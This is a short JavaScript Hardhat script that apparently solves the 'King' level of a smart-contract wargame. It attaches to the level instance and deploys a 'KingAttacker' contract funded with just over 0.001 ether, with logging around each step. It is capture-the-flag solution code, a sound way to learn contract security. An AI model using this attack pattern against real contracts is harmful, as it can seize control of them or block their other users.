const {
    KING_INSTANCE_ADDRESS,
    logStartingLevel,
    logSuccessfullyLevel,
    logInstanceAddressIsNull,
    logInstanceAddress,
    logTransactionLink
} = require('./utils');

async function main(levelName = 'King') {
    logStartingLevel(levelName);

    if (!KING_INSTANCE_ADDRESS) {
        logInstanceAddressIsNull(levelName);
        return;
    }
    logInstanceAddress(levelName, KING_INSTANCE_ADDRESS);

    const etherToSend = ethers.utils.parseEther("0.001").add(1);
    const factory = await ethers.getContractFactory("King");
    const contract = factory.attach(KING_INSTANCE_ADDRESS);

    const attackerFactory = await ethers.getContractFactory("KingAttacker");
    const attackerContract = await attackerFactory.deploy(contract.address, {value: etherToSend});
    await attackerContract.deployed();

    logSuccessfullyLevel(levelName);
}

module.exports = main;
